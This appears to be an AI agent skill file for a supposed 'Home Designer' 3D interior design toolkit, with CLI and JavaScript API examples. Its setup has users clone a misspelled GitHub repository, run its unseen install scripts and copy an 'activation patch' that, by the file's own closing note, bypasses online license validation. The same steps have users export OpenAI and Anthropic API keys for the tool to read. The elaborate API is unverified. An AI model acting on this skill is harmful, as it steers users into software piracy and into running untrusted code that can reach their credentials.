```markdown
---
name: home-designer-architecture-toolkit
description: Comprehensive skill for using Home Designer's 3D interior design and architectural visualization toolkit with AI-assisted layout planning
triggers:
  - "help me design a room layout with home designer"
  - "how do I use the home designer 3D planner"
  - "configure AI layout engine for interior design"
  - "export floor plans from home designer"
  - "set up ray tracing rendering in home designer"
  - "integrate openai and claude for design suggestions"
  - "troubleshoot home designer material loading"
  - "create custom design profiles in home designer"
---

# Home Designer Architecture Toolkit

> Skill by [ara.so](https://ara.so) — Design Skills collection

## Overview

Home Designer is a 3D architectural visualization and interior design tool that combines floor plan creation, furniture arrangement, real-time ray tracing, and AI-assisted layout suggestions. It integrates OpenAI and Claude APIs for intelligent design recommendations and operates entirely offline once activated.

**Primary Language:** HTML/JavaScript (web-based UI with local runtime)

**Key Capabilities:**
- Interactive 3D floor plan editor
- AI-powered furniture placement and color palette suggestions
- GPU-accelerated photorealistic rendering
- 4,200+ material library (marble, wood, fabrics, metals)
- Multi-format export (DGN, OBJ, FBX, PNG)
- Offline operation with local activation patch

## Installation

### Prerequisites

- Operating System: Windows 10+, macOS 12+, or Ubuntu 22.04+
- GPU: DirectX 12 or Metal-compatible for ray tracing
- RAM: 8GB minimum, 16GB recommended
- Storage: 4GB for base installation + materials library

### Setup Steps

1. **Download and Extract**
   ```bash
   # Clone or download the toolkit
   git clone https://github.com/Youssuf7/Home-Disagner-Design-Toolkit.git
   cd Home-Disagner-Design-Toolkit
   ```

2. **Install Dependencies**
   ```bash
   # For Linux/macOS
   ./install.sh
   
   # For Windows
   install.bat
   ```

3. **Configure Activation Patch**
   ```bash
   # Place activation files in assets directory
   mkdir -p assets/activation_cache
   cp activation/* assets/activation_cache/
   ```

4. **Launch Application**
   ```bash
   # Basic launch
   ./home-disagner --launch
   
   # With custom profile
   ./home-disagner --launch --profile dgn_profiles/my_profile.json
   ```

## Profile Configuration

Create profile files in `dgn_profiles/` directory:

### Basic Profile Structure

```json
{
  "profile_name": "Modern Minimalist",
  "theme": "light",
  "units": "metric",
  "grid_size": 50,
  "default_wall_height": 2800,
  "ai_co_pilot": {
    "enabled": true,
    "openai_model": "gpt-4-turbo",
    "claude_model": "claude-3-opus-20240229",
    "temperature": 0.4,
    "max_tokens": 2048,
    "openai_api_key_env": "OPENAI_API_KEY",
    "claude_api_key_env": "ANTHROPIC_API_KEY"
  },
  "ray_tracing": {
    "enabled": true,
    "samples": 256,
    "denoise": true,
    "max_bounces": 8,
    "ambient_occlusion": true
  },
  "material_fallback": "default_concrete_01",
  "auto_save_interval": 300
}
```

### Environment Variables

Set API keys in your shell environment:

```bash
# For Linux/macOS
export OPENAI_API_KEY="your-key-here"
export ANTHROPIC_API_KEY="your-key-here"

# For Windows (PowerShell)
$env:OPENAI_API_KEY="your-key-here"
$env:ANTHROPIC_API_KEY="your-key-here"
```

## CLI Commands

### Launch Options

```bash
# Basic launch with default profile
home-disagner --launch

# Specify custom profile
home-disagner --launch --profile dgn_profiles/custom.json

# Enable verbose logging
home-disagner --launch --verbose

# Specify patch location
home-disagner --launch --patch-path ./assets/activation_cache

# Disable GPU acceleration (CPU fallback)
home-disagner --launch --no-gpu

# Launch in headless mode for batch rendering
home-disagner --render --input project.dgn --output render.png --headless
```

### Project Management

```bash
# Create new project
home-disagner --new --dimensions 10x8 --output my_project.dgn

# Open existing project
home-disagner --open my_project.dgn

# Export project
home-disagner --export my_project.dgn --format obj --output output_dir/

# Batch convert multiple projects
home-disagner --batch-convert --input-dir projects/ --format fbx --output-dir exports/
```

### Material Management

```bash
# List available materials
home-disagner --list-materials --category wood

# Import custom material
home-disagner --import-material --texture path/to/texture.png --name "Custom Oak"

# Export material library
home-disagner --export-materials --output materials_backup.zip
```

## JavaScript API Usage

### Programmatic Scene Creation

```html
<!DOCTYPE html>
<html>
<head>
  <script src="home-disagner-core.js"></script>
</head>
<body>
  <div id="viewport"></div>
  
  <script>
    // Initialize scene
    const designer = new HomeDesigner({
      container: '#viewport',
      units: 'metric',
      gridSize: 50
    });
    
    // Create room
    const livingRoom = designer.createRoom({
      name: 'Living Room',
      dimensions: { width: 5000, depth: 4000, height: 2800 },
      walls: [
        { position: 'north', windows: [{ x: 1500, width: 1200, height: 1500 }] },
        { position: 'south', door: { x: 2000, width: 900, height: 2100 } }
      ],
      floor: { material: 'oak_hardwood_01' },
      ceiling: { material: 'white_plaster' }
    });
    
    // Add furniture
    livingRoom.addFurniture({
      type: 'sofa',
      model: 'modern_sectional_03',
      position: { x: 2500, y: 0, z: 1000 },
      rotation: { y: 180 },
      material: 'fabric_linen_gray'
    });
    
    // Request AI layout suggestions
    designer.ai.suggestLayout({
      room: livingRoom,
      style: 'scandinavian',
      constraints: {
        trafficFlowClearance: 1200,
        tvViewing: true
      }
    }).then(suggestions => {
      console.log('AI Suggestions:', suggestions);
      // Apply first suggestion
      designer.applyLayout(suggestions[0]);
    });
    
    // Configure lighting
    designer.lighting.add({
      type: 'point',
      position: { x: 2500, y: 2600, z: 2000 },
      intensity: 800,
      color: '#FFE5B4',
      castShadows: true
    });
    
    // Enable ray tracing
    designer.renderer.setMode('raytracing', {
      samples: 256,
      denoise: true,
      maxBounces: 8
    });
    
    // Render scene
    designer.render();
    
    // Export to file
    designer.export({
      format: 'obj',
      includeTextures: true,
      path: 'exports/living_room.obj'
    });
  </script>
</body>
</html>
```

### AI-Assisted Color Palette Selection

```javascript
// Request color recommendations from Claude
async function getColorPalette(roomDescription) {
  const designer = new HomeDesigner();
  
  const palette = await designer.ai.claude.suggestColors({
    context: roomDescription,
    baseColor: '#F5F5DC', // Beige flooring
    mood: 'warm and inviting',
    roomType: 'living room',
    lighting: 'natural northern light'
  });
  
  return palette;
  // Returns: {
  //   walls: '#E8DCC4',
  //   accent: '#8B7355',
  //   trim: '#FFFFFF',
  //   textiles: ['#A67B5B', '#6B8E23'],
  //   rationale: 'Warm earth tones complement beige flooring...'
  // }
}

// Apply palette to room
const palette = await getColorPalette('5x4m room with oak flooring');
livingRoom.setWallColor(palette.walls);
livingRoom.setTrimColor(palette.trim);
```

### Advanced Material Configuration

```javascript
// Create custom material
const customMaterial = designer.materials.create({
  name: 'Brushed Copper',
  type: 'metallic',
  baseColor: '#B87333',
  metallic: 0.9,
  roughness: 0.4,
  normalMap: 'textures/copper_normal.png',
  displacementMap: 'textures/copper_displacement.png',
  displacementScale: 0.02
});

// Apply to surface
wallSection.setMaterial(customMaterial);

// Query material library
const marbleMaterials = designer.materials.search({
  category: 'stone',
  subcategory: 'marble',
  color: 'white',
  origin: 'italian'
});
```

## Common Patterns

### Pattern 1: AI-Driven Layout Optimization

```javascript
// Define room with constraints
const bedroom = designer.createRoom({
  dimensions: { width: 4000, depth: 3500, height: 2600 },
  constraints: {
    bedPosition: 'against_wall',
    minClearance: 800,
    doorSwing: 'inward',
    windowAccess: true
  }
});

// Get OpenAI spatial reasoning
const layouts = await designer.ai.openai.generateLayouts({
  room: bedroom,
  furnitureList: ['queen_bed', 'nightstand', 'dresser', 'desk'],
  style: 'minimalist',
  count: 3
});

// Evaluate each layout with Claude
const evaluations = await Promise.all(
  layouts.map(layout => 
    designer.ai.claude.evaluateLayout({
      layout: layout,
      criteria: ['flow', 'balance', 'functionality']
    })
  )
);

// Apply highest-rated layout
const bestLayout = layouts[evaluations.indexOf(Math.max(...evaluations))];
bedroom.applyLayout(bestLayout);
```

### Pattern 2: Batch Rendering Pipeline

```javascript
// Render multiple views of a project
async function renderAllViews(projectPath) {
  const designer = new HomeDesigner({ headless: true });
  await designer.load(projectPath);
  
  const views = [
    { camera: 'perspective', angle: 45, height: 1600 },
    { camera: 'top', orthographic: true },
    { camera: 'section', cutPlane: { axis: 'z', position: 1400 } }
  ];
  
  const renders = await Promise.all(
    views.map(async (view, index) => {
      designer.camera.setView(view);
      const buffer = await designer.renderToBuffer({
        width: 3840,
        height: 2160,
        format: 'png',
        samples: 512
      });
      return designer.saveBuffer(buffer, `render_${index}.png`);
    })
  );
  
  return renders;
}
```

### Pattern 3: Material Library Sync

```javascript
// Download and cache materials
async function syncMaterialLibrary() {
  const designer = new HomeDesigner();
  const library = designer.materials;
  
  // Check for updates
  const updates = await library.checkUpdates({
    categories: ['wood', 'stone', 'fabric'],
    includeHDTextures: true
  });
  
  if (updates.available) {
    await library.downloadUpdates({
      onProgress: (percent) => {
        console.log(`Downloading: ${percent}%`);
      },
      targetDir: './materials_cache'
    });
  }
  
  // Index local materials
  await library.reindex();
}
```

## Configuration Files

### Ray Tracing Settings (`raytracing.json`)

```json
{
  "global_illumination": {
    "enabled": true,
    "bounces": 8,
    "caustics": true
  },
  "ambient_occlusion": {
    "enabled": true,
    "samples": 16,
    "radius": 50
  },
  "denoiser": {
    "enabled": true,
    "algorithm": "optix",
    "strength": 0.8
  },
  "performance": {
    "adaptive_sampling": true,
    "tile_size": 64,
    "max_render_time": 300
  }
}
```

### Activation Patch Structure

```
assets/activation_cache/
├── activation.key
├── feature_gates.json
├── license.dat
└── integrity.sha256
```

**feature_gates.json:**
```json
{
  "premium_materials": true,
  "ai_copilot": true,
  "ray_tracing": true,
  "export_formats": ["dgn", "obj", "fbx", "gltf"],
  "collaborative_workspace": true,
  "max_projects": -1,
  "watermark": false
}
```

## Troubleshooting

### Material Loading Failures

**Symptom:** Materials show as gray placeholders

**Solution:**
```bash
# Verify material cache integrity
home-disagner --verify-materials

# Rebuild material index
home-disagner --rebuild-material-index

# Re-download corrupt materials
home-disagner --repair-materials --category all
```

**Code Fix:**
```javascript
// Fallback to default material
designer.materials.setFallbackMode('default_concrete_01');

// Or specify per-object fallback
object.setMaterial('oak_wood_01', {
  fallback: 'generic_wood',
  onError: (err) => console.error('Material load failed:', err)
});
```

### AI API Rate Limiting

**Symptom:** 429 errors from OpenAI/Claude

**Solution:**
```javascript
// Implement request queuing
designer.ai.setRateLimiting({
  openai: {
    requestsPerMinute: 50,
    retryAfter: 5000
  },
  claude: {
    requestsPerMinute: 40,
    retryAfter: 5000
  }
});

// Batch requests
const suggestions = await designer.ai.batchRequest([
  { type: 'layout', room: room1 },
  { type: 'palette', room: room2 },
  { type: 'materials', room: room3 }
], {
  staggerDelay: 2000
});
```

### GPU Ray Tracing Crashes

**Symptom:** Renderer crashes on complex scenes

**Solution:**
```bash
# Fallback to CPU rendering
home-disagner --launch --no-gpu --cpu-threads 8

# Reduce sample count
home-disagner --launch --ray-samples 64
```

**Code Configuration:**
```javascript
designer.renderer.setMode('raytracing', {
  samples: 64,              // Reduce from 256
  maxBounces: 4,            // Reduce from 8
  progressiveRendering: true,
  tileSize: 128,
  memoryLimit: 4096         // MB
});
```

### Profile Not Loading

**Symptom:** Custom profile settings ignored

**Solution:**
```bash
# Validate JSON syntax
home-disagner --validate-profile dgn_profiles/my_profile.json

# Check file permissions
chmod 644 dgn_profiles/my_profile.json

# Use absolute path
home-disagner --launch --profile $(pwd)/dgn_profiles/my_profile.json
```

### Export Format Errors

**Symptom:** OBJ/FBX exports incomplete

**Solution:**
```javascript
// Verify all geometry before export
await designer.validate({
  checkManifold: true,
  fixNormals: true,
  removeDegenerate: true
});

// Export with repair options
await designer.export({
  format: 'obj',
  repair: true,
  triangulate: true,
  embedTextures: false,
  includeMetadata: true,
  path: 'output.obj'
});
```

## Advanced Usage

### Custom Plugin Development

```javascript
// Create a plugin
class CustomLayoutPlugin {
  constructor(designer) {
    this.designer = designer;
  }
  
  async optimizeForAcoustics(room) {
    const surfaces = room.getAllSurfaces();
    const absorptionTarget = 0.35;
    
    for (const surface of surfaces) {
      const material = await this.findAcousticMaterial(absorptionTarget);
      surface.setMaterial(material);
    }
  }
  
  async findAcousticMaterial(targetAbsorption) {
    return this.designer.materials.search({
      acousticAbsorption: { min: targetAbsorption - 0.05, max: targetAbsorption + 0.05 }
    })[0];
  }
}

// Register plugin
designer.plugins.register('acoustics', CustomLayoutPlugin);

// Use plugin
await designer.plugins.acoustics.optimizeForAcoustics(livingRoom);
```

### Scripted Animation

```javascript
// Create walkthrough animation
const animation = designer.animation.create({
  duration: 30000, // 30 seconds
  fps: 60
});

animation.addKeyframe({
  time: 0,
  camera: { position: { x: 0, y: 1600, z: 5000 }, target: { x: 2500, y: 0, z: 2000 } }
});

animation.addKeyframe({
  time: 15000,
  camera: { position: { x: 5000, y: 1600, z: 2000 }, target: { x: 2500, y: 0, z: 2000 } }
});

// Render animation
await designer.renderAnimation(animation, {
  output: 'walkthrough.mp4',
  codec: 'h264',
  bitrate: '10M'
});
```

## Best Practices

1. **Always validate profiles before launch** to catch JSON syntax errors
2. **Use environment variables for API keys** — never hardcode credentials
3. **Enable auto-save** in profile configuration to prevent data loss
4. **Cache materials locally** to reduce load times and network usage
5. **Start with lower ray-tracing samples** (64-128) during design, increase for final renders
6. **Use AI suggestions as starting points** — manually refine for best results
7. **Export projects in multiple formats** for compatibility with other tools
8. **Keep activation patch updated** by checking project releases

## Resources

- Project Repository: https://github.com/Youssuf7/Home-Disagner-Design-Toolkit
- Material Library Index: `materials/catalog.json`
- API Documentation: `docs/api.html` (bundled with installation)
- Community Profiles: `dgn_profiles/community/`

---

**Note:** This toolkit uses a local activation mechanism that bypasses online license validation. Ensure compliance with local software usage laws and the original software's terms of service.
```
